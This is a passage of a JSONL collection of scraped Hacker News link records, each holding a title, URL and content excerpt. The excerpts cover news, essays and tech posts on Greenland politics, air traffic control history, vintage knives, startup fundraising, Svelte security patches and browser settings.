the best of times. For a colloquial word like this, which would have appeared much earlier and more frequently in speech than in writing, it is especially tricky to establish a definite timeline.\"", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Confronted over Greenland Europe is ditching its softly-softly approach to Trump", "url": "https://www.bbc.co.uk/news/articles/c0lx7j1lrwro", "content": "Confronted over Greenland Europe is ditching its softly-softly approach to Trump. Something in Europe has snapped. Donald Trump doubled down again on Monday night in his insistence that the US \"has to have\" Greenland for national security reasons. He predicted that Europe's leaders aren't \"gonna push back too much\". But that's not the plan they have in mind when their paths cross with the US president at the World Economic Forum (WEF) on Wednesday. Greenland is a semi-autonomous territory of Denmark - a member of the EU and of Nato. President Trump is now leaning heavily on Denmark's allies in both those organisations to abandon Copenhagen and let the US take control of Greenland, or face punitive taxes on all their exports to the United States. It's a horror scenario for European economies, which are already in the doldrums, especially those reliant on exporting to the US like Germany's car industry and Italy's luxury goods market. Polls suggest that 55% of Americans don't want to buy Greenland On Monday Germany's finance minister said “we will not allow ourselves to be blackmailed,” after an emergency meeting ahead of the WEF with his French counterpart. The Trump threats landed like a slap in the face of European governments, who (separately, in the case of the EU and the UK) had only just settled tariff deals with the US president last year. \"We're living through uncharted territories. We've never seen this before. An ally, a friend of 250 years, is considering using tariffs… as a geopolitical weapon,\" said France's Finance Minister Roland Lescure.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Just the Browser", "url": "https://justthebrowser.com/", "content": "Just the Browser. Just the Browser helps you remove AI features, telemetry data reporting, sponsored content, product integrations, and other annoyances from desktop web browsers. The goal is to give you \"just the browser\" and nothing else, using hidden settings in web browsers intended for companies and other organizations. This project includes configuration files for popular web browsers, documentation for installing and modifying them, and easy installation scripts. Everything isopen-source on GitHub. The setup script can install the configuration files in a few clicks. You can also follow the manual guides forGoogle Chrome,Microsoft Edge, andFirefox. Windows:Open a PowerShell prompt as Administrator. You can do this by right-clicking the Windows button in the taskbar, then selecting the \"Terminal (Admin)\" or \"PowerShell (Admin)\" menu option. Next, copy the below command, paste it into the window (Ctrl+V), and press the Enter/Return key: Mac and Linux:Search for the Terminal in your applications list and open it. Next, copy the below command, paste it into the window (Ctrl+VorCmd+V), and press the Enter/Return key: You can subscribe to the RSS/Atom releases feed to know when there are important changes to the configuration files, documentation, and scripts: This feed can be used withFeedly,Inoreader,The Old Reader,Feedbin, or any other reader tool. You can also subscribe to new releases with your GitHub account by clicking the Watch button onthe repository, then selecting Custom > New releases. Start here if you don't have your preferred web browser installed. You can install the configuration files afterwards. macOS (Universal)Windows 64-bit x86 (amd64)Windows 32-bit x86Windows 64-bit ARM (ARM64)Debian/Ubuntu 64-bit x86 (amd64)Fedora/openSUSE 64-bit x86 (amd64) Not sure which link to use? Try theofficial download page.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Iconify: Library of Open Source Icons", "url": "https://icon-sets.iconify.design/", "content": "Iconify: Library of Open Source Icons", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Military Is Being Forced to Plan for an Unthinkable Betrayal", "url": "https://www.theatlantic.com/ideas/2026/01/us-military-trump-greenland/685677/", "content": "The Military Is Being Forced to Plan for an Unthinkable Betrayal. The United States is a global superpower, and its military trains for war in every domain. During my years as a military educator, I saw American officers wrestle with any number of scenarios designed to challenge their thinking and force them to adapt to surprises. One case we never considered, however, was how to betray and attack our own allies. We did not ask what to do if the president becomes a threatening megalomaniac who tells one of our oldest friends,Norway, that because the Nobel Committee in Oslo refuses to give him a trophy, he no longer feels “an obligation to think purely of Peace” and can instead turn his mind toward planning to wage war against NATO. As my colleague Anne Applebaum wrote today, Donald Trump’s threatening message to the Norwegian prime minister should, in any responsible democracy, force the rest of the U.S. political system to act to control him. The president is talking about an invasion that would require “citizens of a treaty ally,” as she put it, “to become American against their will,” all because he “now genuinely lives in a different reality.” And yet neither Congress nor the sycophants in the White House seem willing to stop him. Anne Applebaum: Trump’s letter to Norway should be the last straw The U.S. military is obligated by law, and by every tradition of American decency, to refuse to follow illegal orders. But what about orders that may not be illegal but are clearly immoral and illogical? The president, for example, can order the Pentagon toplanfor an invasion of Greenland; such an order would be little more than a direction to organize one more war game. (The military, as it sometimes does duringwar games, might not even use real place names, but rather use maps that look a lot like the North Atlantic as it organizes an invasion of “Verdegrun” or something.) But after years of experience with American military officers, I believe that even these hypothetical instructions will sound utterly perverse to men and women who have served with the Danes and other NATO allies. Denmark not only was our ally during the world wars of the 20th century, but also, as my colleague Isaac Stanley-Becker has written, joined our fight against the Taliban after 9/11 and sufferedsignificant casualtiesfor a small nation. Their soldiers bled and died on the same battlefields as Americans. American officers knowwhat Trump is planning—the world knows it, because Trump won’t stop saying it—and their minds will rebel at directives to take everything they’ve prepared to do for years and apply itbackwards, against the people they have trained to work with and protect. The president, in other words, will be ordering them to do somethingthey have been trainednever to do. America’s armed forces are conditioned to obey the orders of civilian authorities, and rightly so. But these will be orders that force U.S. military minds to step into a horrifyingmirror universewhere the United States is the aggressor against NATO, a coalition that includes countries that have been our friends for centuries. Should Trump pursue this scheme of conquest, the military’s training will have to be shattered and reassembled into a destructive version of itself, as if doctors were asked to take lifesaving medicines, reconstitute them as poisonous isomers, and then administer them to patients. I think back to my days as the chairman of the Strategy and Policy Department at the War College, and I can only imagine what would have happened had I convened the faculty and students and said: “It’s time for us to think about how you might plan for an American invasion of a NATO country. Small nations have no claim to sovereignty and cannot defend their borders or possessions; we should create case studies for seizing whatever we want from them.” The most likely outcome of such a meeting is that I would have been called in to explain myself to my superiors. If I had stayed fixated on such an idea, I might have been relieved of my leadership duties. If I had remained as adamant as Trump has become on the subject, I might have been directed to seek counseling or even undergo a renewed background check. Today, however, this aggressive and immoral stance is the policy of the commander in chief—because when the president speaks, it is policy—and he may well order the military to move it from rhetoric to reality. Tom Nichols: The silence of the generals", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Consent-O-Matic", "url": "https://github.com/cavi-au/Consent-O-Matic", "content": "Consent-O-Matic", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Air traffic control: the IBM 9020", "url": "https://computer.rip/2026-01-17-air-traffic-control-9020.html", "content": "Air traffic control: the IBM 9020. Previously onComputers Are Bad,we discussed theearly history of air\ntraffic control in the United States.\nThe technical demands of air traffic control are well known in computer history\ncircles because of the prominence of SAGE, but what's less well known is that\nSAGE itself was not an air traffic control system at all. SAGE was an airdefensesystem, designed for the military with a specific task of ground-controlled\ninterception (GCI). There is natural overlap between air defense and air\ntraffic control: for example, both applications require correlating aircraft\nidentities with radar targets. This commonality lead the Federal Aviation Agency\n(precursor to today's FAA) to launch a joint project with the Air Force to\nadapt SAGE for civilian ATC. There are also significant differences. In general, SAGE did not provide any\nsafety functions. It did not monitor altitude reservations for uniqueness,\nit did not detect loss of separation, and it did not integrate instrument\nprocedure or terminal information. SAGE would need to gain these features to\nmeet FAA requirements, particularly given the mid-century focus on\nmid-air collisions (a growing problem, with increasing air traffic, that SAGE\ndid nothing to address). The result was a 1959 initiative called SATIN, for SAGE Air Traffic Integration.\nAround the same time, the Air Force had been working on a broader enhancement\nprogram for SAGE known as the Super Combat Center (SCC). The SCC program was\nseveral different ideas grouped together: a newer transistorized computer to\nhost SAGE, improved communications capabilities, and the relocation of Air\nDefense Direction Centers from conspicuous and vulnerable \"SAGE Blockhouses\"\nto hardened underground command centers, specified as an impressive 200 PSI\nblast overpressure resistance (for comparison, the hardened telecommunication\nfacilities of the Cold War were mostly specified for 6 or 10 PSI). At the program's apex, construction of the SCCs seemed so inevitable that the\nAir Force suspended the original SAGE project under the expectation that SCC\nwould immediately obsolete it. For example, my own Albuquerque was one of the\nlast Air Defense Sectors scheduled for installation of a SAGE computer. That\ninstallation was canceled; while a hardened underground center had never\nbeen in the cards for Albuquerque, the decision was made to otherwise build\nAlbuquerque to the newer SCC design, including the transistorized computer.\nBy the same card, the FAA's interest in a civilian ATC capability, and thus\nthe SATIN project, came to be grouped together with the SCC program as just\nanother component of SAGE's next phase of development. SAGE had originally been engineered by MIT's Lincoln Laboratory, then the\nnational center of expertise in all things radar. By the late 1950s a\nlarge portion of the Lincoln Laboratory staff were working on air defense\nsystems and specifically SAGE. Those projects had become so large that\nMIT opted to split them off into a new organization, which through some\nobscure means came to be called the MITRE Corporation. MITRE was to be a\ngeneral military R&D and consulting contractor, but in its early years it\nwas essentially the SAGE company. The FAA contracted MITRE to deliver the SATIN project, and MITRE subcontracted\nsoftware to the Systems Development Corporation, originally part of RAND and\namong the ancestors of today's L3Harris. For the hardware, MITRE had long\nused IBM, who designed and built the original AN/FSQ-7 SAGE computer and\nits putative transistorized replacement, the AN/FSQ-32. MITRE began a\nseries of engineering studies, and then an evaluation program on prototype\nSATIN technology. There is a somewhat tenuous claim that you will oft see repeated, that the\nAN/FSQ-7 is the largest computer ever built. It did occupy the vast majority\nof the floorspace of the four-story buildings built around it. The power\nconsumption was around 3 MW, and the heat load required an air conditioning\nsystem at the very frontier of HVAC engineering (you can imagine that nearly\nall of that 3 MW had to be blown out of the building on a continuing basis).\nOne of the major goals of the AN/FSQ-32 was reduced size and power consumption,\nwith the lower heat load in particular being a critical requirement for\ninstallation deep underground. Of course, the \"deep underground\" part more\nthan wiped out any savings from the improved technology. By the late 1950s, enormous spending for the rapid built-out of defense systems including\nSAGE and the air defense radar system (then thePermanent System)\nhad fatigued the national budget and Congress. The winds of the Cold War had\nonce again changed. In 1959, MITRE had begun operation of a prototype\ncivilian SAGE capability called CHARM, the CAA High Altitude Remote\nMonitor (CAA had become the FAA during the course of the CHARM effort).\nCHARM used MIT's Whirlwind computer to process high-altitude radar\ndata from the Boston ARTCC (Air Route Traffic Control Center), which it displayed to operators while\ncontinuously evaluating aircraft movements for possible conflicts. CHARM was\ndesigned for interoperability with SAGE, the ultimate goal being the addition\nof the CHARM software package to existing SAGE computers. None of that would\never happen; by the time the ball dropped for the year 1960 the Super\nCombat Center program had been almost completely canceled. SATIN, and the\nwhole idea of civilian air traffic control with SAGE, became blast damage. In 1961, the Beacon Report concluded that there was an immediate need for a\ncentralized, automated air traffic control system. Mid-air collisions had\nbecome a significant political issue, subject of congressional hearings and\nGAO reports. The FAA seemed to be failing to rise to the task of safe civilian\nATC, a perilous situation for such a new agency... and after the cancellation of\nthe SCCs, the FAA's entire plan for computerized ATC was gone. During the late 1950s and 1960s, the FAA adopted computer systems in a piecemeal\nfashion. Many enroute control centers (ARTCCs), and even some terminal facilities,\nhad some type of computer system installed. These were often custom software\nrunning on commodity computers, limited to tasks like recording flight plans and\nmaking them available to controllers at other terminals. Correlation of radar\ntargets with flight plans was generally manual, as were safety functions like\nconflict detection.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "No knives, only cook knives", "url": "https://kellykozakandjoshdonald.substack.com/p/no-knives-only-cook-knives", "content": "No knives, only cook knives.  When I first started buying vintage knives at the flea market, I had a few prearranged stops: people who would regularly find knives and liked dealing with me, and I liked dealing with them, too. Otherwise, I would walk around asking the sellers if they had any knives. In the early days from 2005 to 2008, it was common for people to say, “No, but I do have some cook knives”. Most people asking around for knives at 6 am back then were looking for old military, pocket, and hunting knives. Culinary knives were considered chaff, often sold for $1 to $5 because they were deemed to have little value beyond utilitarian use. Within about 5 to 8 years, it seems one of these dealers heard from someone that a Sabatier sold for $100 online, and after that, every Sabatier became worth $100, and in the eyes of many, every chef' knife became a Sabatier. Deceased people whose families had no interest in their stuff and people who didn’t pony up on their storage unit bills started having fewer and fewer good knives in their stuff, and eventually, the volume of good culinary knives made their way less and less to the market. This is the short version of my small microcosm as seen from a Bay Area perspective; maybe it's different elsewhere, but this is my experience. There would be a feeding frenzy as good stuff was available to be found from about 5 am to 7:30 am.  The fresh goods were put out first thing in the morning. By then, the best stuff had been snatched up by the professional pickers before the general public arrived around 8 or 9. At this time, sometimes a second tier of boxes would come out, and something good would turn up. By this time, I had been walking for 3 or 4 hours and would be getting hungry, and the tiredness would be setting in, my eyes would feel dry, and my face would hurt from sleep deprivation. This feeling was a familiar feeling at this time in my life, with kids born in ‘04 and ‘08, little sleep, and the necessity to work long hours when I could. Sunday was especially long hours, even if a baby had been up the night before; getting in a good haul was crucial in those days. A couple of bags heavy with knives by 7 or 8 meant I could go home early and start cleaning that week’s finds. If I got started early enough, I might sell enough to have a good buying budget by next Sunday and even spend lavishly on rent, bills, and food. I learned what to pass up, mostly the hard way, buying a knife for $10 and selling it for $8 at auction, for instance, or that any knife with a chef’s name on it would probably get laughed at in a professional kitchen. These shame-filled events and their associated knives were etched in my memory. I would walk on by if I saw them, keep scanning for the telltale handle of a chef knife, a box that could contain pocket knives, or a box of kitchen utensils that could have a stowaway knife in it. I could scan the primmest, most tastefully turned out booth in 10 seconds and the biggest heap of meth rubble that vomited itself out the back of a dirty white van in 20 seconds. I got good at finding things quickly and keeping a straight face, asking how much something was when I found something great. There were a few other guys who were also looking for knives; sometimes they had another specialty too, maybe old fishing gear or old pens or lighters. There were generalist buyers and specialists like me, the Johnny one notes. There were the watch guys (they were all guys), the camera people, the jewelry people who formed little conspiratorial-looking huddles with little bottles of acid and scales. The book people were usually very easy-going, and the people looking for art were often the most hostile, snotty, bump you and not say ‘excuse me’ types. The worst offender looked like a nelly Ichabod Crane and wore the least convincing toupee since Xavier Cugat. For the most part, some of the most polite were the knife guys; they would never start digging around in a box you were already sorting. Getting stabbed wasn’t a threat per se, but multiple hands in a box of knives is a bad idea. We would wait and even tell others if we passed up something somebody else might be into. Typically, a trip to the market would lead up to a time late in the morning when I would start to get the feeling that it was time to go.  Often, I was still looking around, maybe I hadn’t made a good buy in 30 minutes to an hour, or someone I hoped to see wasn’t there. Maybe another market was happening somewhere else that drew a lot of regular vendors away. Anyhow, at this ‘certain time’ I would be feeling a little desperate to make a score and would start looking at stuff I typically wouldn’t. Certain vendors who generally priced things too high or had the same shit on display for months and years, one side getting bleached from the sun, baking away Sunday after Sunday in a wood box under a heavily worn sheet of plexiglass, looking like the smell of a diaper pail. I would ask myself what the hell I was doing looking at that sunbleached shit and would make the walk up the hill home to drink coffee and take my kids to the playground. Other times, I would pick things up that I knew had little value just to pick something up. I did have one hard and fast metric for when it was time to go home, like a disciplined barfly who held themselves to certain standards, and that was when I intentionally picked up a Forgecraft or Old Hickory knife. These knives are not really bad for inexpensive American-made carbon steel knives from the 1950s and ‘60s. They are instantly recognizable, with boxy hickory handles and a kind of rectangular waffle pattern with a black forge scale and a big, wide primary grind on the carbon steel blades. There were so many of them, and typically the condition was so-so (like airplane food that was awful and in such small portions). They never fetched much, but they were fine from a utilitarian standard, provided they weren’t too thick from being sharpened down 500 times. From my perspective, even if purchased cheaply, they just treaded water money-wise and were not worth the time. I had a contract with myself; if I picked one up, it was time to go home. It was usually about 9:30 by that time, and everything good was gone. More than just the association with the disappointment of getting a final bid of $12.48 on an ebay auction after having spent $10, I rejected them for the self-loathing of needy 9:30 am flea market choices. Self-consciously having an emotional need to be lucky and feeling like a ragpicker. Fuck that. Around 2018, I began noticing people bringing re-handled Forgecraft chef knives to the shop for sharpening. I was a little dumbstruck; it struck me as more than a little weird. I think I also felt that all my efforts to introduce people to the great old culinary knives were in vain, as this trailer trash was being crowned. I vaguely remember acting the cranky old man, accusing people of ‘putting lipstick on a pig’ when finding them rehandling expensive materials in sharpening orders. Maybe I wasn’t being fair, I suspected but I also didn’t understand why go to so much trouble to re-handle and polish a Forgecraft. That said, the overall footprint geometry of a brand new Forgecraft chef knife is not terrible aside from the thickness of the tip half. In designing chef knives, I default to essentially a more symmetrical-sided triangle of a footprint like the Forgecraft has. it’s actually a bit more wa-gyuto-like than a typical Western knife, and if one is determined / sophisticated enough, the wide primary bevels do allow for thinning. It’s still a little to thick to cut nicely, I think, but with a good thinning, the geometry isn’t bad. The .95% carbon steel is not hard to sharpen and can take a fairly fine edge. I don’t seem to remember them keeping an edge super well, times that I have experimented with them but I do remember being very happy with one for a short period of time that I got from Jivano on 18th street (where 18 Reasons is now) in 1993 or 94. I did have several that I used in my home kitchens before starting Bernal Cutlery, and after starting, I did use a Forgecraft chef knife early on, in about 2005 or 6, for a few weeks. Beyond being a worse sharpener than I realized back then, they are too thick and don’t seem to hold an edge really well. So I started touching Forgecraft knives again, and maybe giving them a less judgmental view. I had to ask myself in my orthodoxy, was I being like the old timers at the flea market who told me they didn’t have any knives but had some kitchen knives? Did resale value influence my assessment of the intrinsic value of these knives? To be fair, I could start to see why people were excited by them, but also had a little bit of suspicion as the nearly identical ‘Old Hickory’ knives made by the Ontario knife company got no love, and I suspected there was a kind of internet trend going on with Forgecraft. Both seem to be a soft heat treatment of a fairly high carbon content non-stainless steel; 1095 (.95% carbon), with the forge scale waffle pattern face and big wide primary bevels and hickory handles. In re-examining my attitudes about the Forgecraft chef knife (I still think they are a little ungraceful in their lack of taper and heavy tip), I have thought about changing tastes and young people getting into old stuff. The Forgecraft craze is over, I think, but I am happy to see younger people take a new interest in old culinary knives. While there will be other fads that come and go with it I think this interest has an immense durability as culinary knives are not going away, and they represent an item from history that we can directly relate to using. That said I will shit when people start collecting Ikea knives, I hope I live long enough to see it so then I can scoff.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Pocket TTS: A high quality TTS that gives your CPU a voice", "url": "https://kyutai.org/blog/2026-01-13-pocket-tts", "content": "Pocket TTS: A high quality TTS that gives your CPU a voice", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Raising money fucked me up", "url": "https://blog.yakkomajuri.com/blog/raising-money-fucked-me-up", "content": "Raising money fucked me up. January 15, 2026 About four months ago I quit my job atDoublepointand decided to start my own thing. I'd been working on a little project with Pedrique (who would become my co-founder) for a bit over half-a-year and decided I had enough signal to determine he was someone I wanted to start a business with. I was excited about the idea we were working on at the time (we were live with paying customers and truly believed in the thesis), but in hindsight, being truly honest about my motivations, I mostly wanted to run my own thing. In a dream world I'd have had the \"idea of my life\" while working atPostHogorDoublepointand have gone on to build that with maximum conviction but this wasn't the case, so I got tired of waiting for a spark and decided to go out and make it happen, with the idea we were working on being our best bet at the time. Since I'd just quit my job, I had my finances well in order. Thus, my ideal scenario would have been to keep working on the product we had, try to scale it, and if that didn't work, try something else, then something else, until something did indeed really get off the ground, and only at that point we would consider whether or not to raise VC funding, depending on whether it made sense or not. My ideal scenario wasn't going to work for Pedrique, though. He had told me for a while that the money he had saved up for trying to build his own thing was running out and that soon he'd need to start freelancing or something to make some income in order to sustain the search for a little longer. Prior to us working together, he had a bit of success with his MicroSaaS products but only just enough to increase his personal runway, which was now reasonably short. We had spoken about this before, but with me now being 110% in, we had to do something about it. I had just come in full-time so we weren't about to go back to a dynamic where one person was full-time and the other part-time because they needed to make ends meet. The decision then became clear: we're gonna raise. At that point, it was an easy decision to make. Again, we have two co-founders who have a lot of confidence in each other, and we don't want to let the opportunity pass us by. So while this wasn't my ideal choice, we were a business now and this was the best decision for the company. \"Just don't die\" goes the advice I think, and Skald had just then been born. And so raise we did. We brought in four phenomenal angels, including, and this is relevant, my last few bosses (PostHog co-founders James and Tim and Doublepoint co-founder Ohto), and then decided to look for an early-stage fund. We eventually landed withBroom Venturesand passed up on a few other opportunities to limit dilution. Great, right? I didn't need a salary yet, but for equality purposes, I now had one. Our investors are amazing. James and Ohto have been particularly helpful as angels (thank you!), and our investors are all founders of successful companies, including Jeff and Dan, the Broom GPs. We're super early, but Broom has been massively helpful and all-around just a great hands-off VC to deal with.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Xenia – A monospaced font built with a custom Python engine", "url": "https://github.com/Loretta1982/xenia", "content": "Show HN: Xenia – A monospaced font built with a custom Python engine", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "CVEs affecting the Svelte ecosystem", "url": "https://svelte.dev/blog/cves-affecting-the-svelte-ecosystem", "content": "CVEs affecting the Svelte ecosystem. We’ve released patches for 5 vulnerabilities acrossdevalue,svelte,@sveltejs/kit, and@sveltejs/adapter-node. Here’s what you need to know: If you’re using any of these packages, upgrade them to their corresponding non-vulnerable versions: For cross-dependent packages —svelteand@sveltejs/kitdepend ondevalue— patched versions already include upgraded dependencies. We’re extremely thankful to all of the security researchers who responsibly disclosed these vulnerabilities and worked with us to get them fixed, to the security team at Vercel who helped us navigate the disclosure process, and to the maintainers who worked to publish the fixes. Over the last few weeks, we’ve seen a spate of high profile vulnerabilities affecting popular tools across the web development ecosystem. While they are unfortunate, it has been encouraging to see the community pulling together to keep end users safe. Using the lessons learned from these vulnerabilities, we will invest in processes that will help catch future bugs during the writing and review phases,beforethey go live. If you think you have discovered a vulnerability in a package maintained by the Svelte team, we urge you to privately report it via the Security tab on the repo in question (or theSvelte repo, if unsure). Full reports are available in the published security advisories, but we’ve included a brief summary of each below. (Yes, this is very similar to the previous CVE. No, it is not the same!)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "60% of Legal Searches Now End Without a Click", "url": "https://talk24.ai/blog/ai-killing-legal-search", "content": "60% of Legal Searches Now End Without a Click. 60% of legal searches now end without anyone clicking through to a website. Google's AI Overviews answer questions like \"what to do after a car accident\" right there on the results page. No click needed. By mid-2026, that number is expected to hit 70-80%. For law firms that built their entire client acquisition strategy on Google, this is an existential shift. The data from 2025 tells the story clearly.  That's not a gradual decline. It's a collapse in progress. According toQS Digital's analysis of the legal sector in 2025, the median law firm saw website traffic drop 19%. Some firms experienced declines of nearly 80%. The strange part: impressions stayed flat. Firms were still appearing in search results. Users just weren't clicking through anymore. Why? Because the answer was already on the page. AI Overviews provide summaries, suggest next steps, and even curate lists of attorneys. The user makes their decision before visiting a single website. Surefire Local reportsthat when AI Overviews appear, top-ranking pages see a 34.5% drop in click-through rates. Being #1 on Google used to guarantee traffic. Not anymore.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Study: Minimal evidence links social media, gaming to teen mental health issues", "url": "https://www.manchester.ac.uk/about/news/time-spent-on-gaming-and-social-media/", "content": "Study: Minimal evidence links social media, gaming to teen mental health issues. An error occurred while preparing your download A major new study from The University of Manchester has found little evidence that social media use or video gaming are causing mental health problems in young teenagers, challenging one of the most widespread concerns among parents and teachers today.The research - published in theJournal of Public Health-isbased on the experiences of more than 25,000 pupils across Greater Manchester, and is one of the largest and most detailed studies of its kind. The team followed young people aged 11-14 over three school years as part of the #BeeWell programme, which focuses on understanding and improving young people’s wellbeing.For several years, headlines have warned that time spent on TikTok, Instagram or gaming platforms could be driving a rise in anxiety and depression among teenagers - but the Manchester researchers say their findings paint a much more nuanced picture.“We know families are worried, but our results do not support the idea that simply spending time on social media or gaming leads to mental health problems - the story is far more complex than that,” said lead authorDr Qiqi Cheng.The study tracked pupils’ self-reported social media habits, gaming frequency and emotional difficulties over three school years to find out whether technology use genuinely predicted later mental health difficulties. The researchers found no evidence that heavier social media use or more frequent gaming caused increases in symptoms of anxiety or depression over the following year - for boys or girls.However, the study did uncover other interesting patterns. Girls who gamed more often went on to spend slightly less time on social media the following year, and boys who reported more emotional difficulties were more likely to cut back on gaming in the future - a pattern the researchers suggest could be linked to losing interest in hobbies when feeling low, or parents limiting screen time when they notice their child is struggling.The research team also explored whether actively chatting on social media or just passively scrolling made a difference, but the overall picture remained the same - technology habits alone did not appear to drive mental health difficulties.The authors emphasise that this does not mean online experiences are harmless. Hurtful messages, online pressures and extreme content can all have real impacts on wellbeing, but they argue that focusing simply on screen time misses the bigger picture. Our findings tell us that young people’s choices around social media and gaming may be shaped by how they’re feeling, but not necessarily the other way around. Rather than blaming technology itself, we need to pay attention to what young people are doing online, who they’re connecting with and how supported they feel in their daily lives. DOI:https://doi.org/10.1093/pubmed/fdaf150", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Photos capture the breathtaking scale of China's wind and solar buildout", "url": "https://e360.yale.edu/digest/china-renewable-photo-essay", "content": "Photos capture the breathtaking scale of China's wind and solar buildout.  / ←→ A wind farm near the Heidu Mountain Scenic Area in Qinghai Province.Weimin Chu Last year China installed more than half of all wind and solar added globally. In May alone, it added enough renewable energy to power Poland, installing solar panels at a rate of roughly 100 every second. The massive buildout is happening across the country, from crowded eastern cities increasingly topped by rooftop solar panels to remote western deserts where colossal wind farms sprawl across the landscape. “From the ground, it’s hard to grasp the scale of these power plants,”said Chinese photographerWeimin Chu. “But when you rise into the air, you can see the geometry, the rhythm — and their relationship with the mountains, the desert, the sea.” Chu has spent three years capturing the shift underway using drones to photograph power plants from overhead. His work, which draws from the visual language of traditional Chineseink paintings, was featured last year in an award-winning exhibition, presented by Greenpeace. A selection of those photos is reproduced here. “I started out just shooting landscapes,” Chu said. “But when I traveled to places like Guizhou, Yunnan, and Qinghai in 2022, I kept seeing wind farms and solar power plants appear in my camera frame. I realized this is the story of our time — and almost no one is documenting it in a systematic way.” A solar farm in the Daliang Mountains, Sichuan Province.Weimin Chu", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Intent Layer: A context engineering skill for AI agents", "url": "https://www.railly.dev/blog/intent-layer/", "content": "Show HN: Intent Layer: A context engineering skill for AI agents. Today I’m releasing/intent-layer, the first skill fromCrafter Station. Works with Claude Code, Codex, Cursor, Copilot, and10+ more agents. I’ve been using Claude Code daily for months. Same model, same prompts, completely different results depending on the repo. On a large codebase I watched Claude: Reasonable search. Wrong places. Bug still there. Your best engineers don’t grep randomly. They have a mental map: That map took years to build. Your agents don’t have it. Context engineering is designing the full information an agent needs to perform reliably: Intent Layer solves the first piece:system prompt infrastructure. The skill helps you set upAGENTS.mdfiles at folder boundaries. Simple markdown that gives agents the context they can’t get from code alone:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Training my smartwatch to track intelligence", "url": "https://dmvaldman.github.io/rooklift/", "content": "Training my smartwatch to track intelligence. [Commentary onHacker News] Some mornings I’d wake ready for the world—I’d feel alert, clear-headed, present. Other days, I’d retrace my steps 20 times to find my keys, dreading the long day ahead. My sleep was erratic and I didn’t know why. I had invested in a Garmin watch to clarify trends, and it was helping, but it was also missing something. Though great at tracking the body, it was mediocre at tracking the mind. There’s another signal I was using to track the mind, which is chess. I play almost daily, and I found winning or losing to be a good proxy for mental clarity. Chess was the signal absent from my Garmin that I hoped could bridge body to mind. Time to verify if I was right. I downloaded my chess data (date,start ELO,ΔELO) from Lichess, and my Garmin data (about 1.5 years of cross-referenced signal) and put on my data science hat. I was tracking ~20 signals related to exercise and sleep and from them built various statistical models to predict my dailyELOfluctuations. What worked best was also the simplest: tried and true logistic regression. I could predict winning/losing with about 60% accuracy (and confirmed that number through cross-validation). 60% seemed pretty good: absent any signal, the chance of winning should be about 50% because chess apps pair you with like-ELO players. That I could do better than chance wasn’t too surprising. A lot of cognition depends on how well you sleep and exercise. But what exactly does it mean to sleep and exercise well? Which of the signals were actually important? Using a sparse logistic regression solver is a straightforward method to show which features have little (or redundant) predictive power, and I was pretty surprised by the results. Here’s a sample of independent signals from most positively correlated to most negatively correlated *Stress is a proprietary algorithm of Garmin’s creation but is best approximated by 1 / HRV REM sleep was out on top, which isn’t much of a surprise. But apparentlyit helps to be stressed out and avoid recent exercise. Exercise Made Me Dumber– I’d assumed fitness and sharpness went together. And long-term they probably do, but short-term, you’re pitting body against mind. The literature confirms this: exercise-induced fatigue impairs complex cognitive tasks.1 Deep Sleep had no Effect– Supposedly the most restorative phase, but unhelpful for chess. Chess demands working memory and planning, and research shows it’s REM and not deep sleep that targets these capacities.23 Stress Made Me Smarter– As inverse HRV, Garmin’s stress signal really measures your sympathetic nervous system, which is also heightened during alertness and engagement, not just anxiety. According to theYerkes-Dodson law, moderate arousal improves performance on complex tasks. For your mind to be clear, you actually don’t want to be very relaxed.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Dark Mode vs. Light Mode: Which Is Better?", "url": "https://www.nngroup.com/articles/dark-mode/", "content": "Dark Mode vs. Light Mode: Which Is Better?. NEW RESEARCH COURSES:UX Research Methods, Heatmaps |Learn More February 2, 20202020-02-02 Share Recently, spurred by the introduction of dark mode in IOS 13,a reporter asked me to comment on the usability of dark modeand its popularity as a design trend. It’s a question that I also got several times from attendees to ourUX Conference. I must say upfront that NN/g has not done its own research on dark mode. However, these questions prompted me to do a review of the academic literature on whether dark mode has any benefits for users — with normal vision or not. I will share these findings with you. But first, let’s make sure we’re all on the same page by defining some vocabulary. Definition:Contrast polarityis a term used to describe the contrast between the text and the background: Dark-mode displays emit less light than light-mode ones (and, because of that, they might extend battery life). But the amount of light in the environment influences not only power consumption, but also our perception. In order to understand how, let’s briefly review some basic information about the eye pupil and how it reacts to the amount of light in the environment. The human pupil is the gateway to the retina: through it, light reaches the eye. By default, the human pupil changes size depending on the amount of light in the environment: when there is a lot of light, it contracts and becomes narrower, and when it’s dark, it dilates to allow more light to get in. Smaller pupil sizes make the eyes less susceptible tospherical aberrations(in which the image appears unfocused) and increase the depth of field, so people don’t have to work so hard to focus on the text, which, in turn, means that their eyes are less likely to get tired. (Camera apertures work exactly in the same way: a photo taken at f/2.8 will have a narrower depth of field and thus more blurring than one taken at f/16.) As we age, the pupil decreases in size. Too small pupil sizes mean that too little light enters the eye, which impairs our ability to read or detect text, especially in low ambient light (for example, at night). On the other side, as we get older, we become more susceptible to glare, and glare is particularly likely under bright light.", "source": "HackerNews", "date": null, "author": null, "score": null}
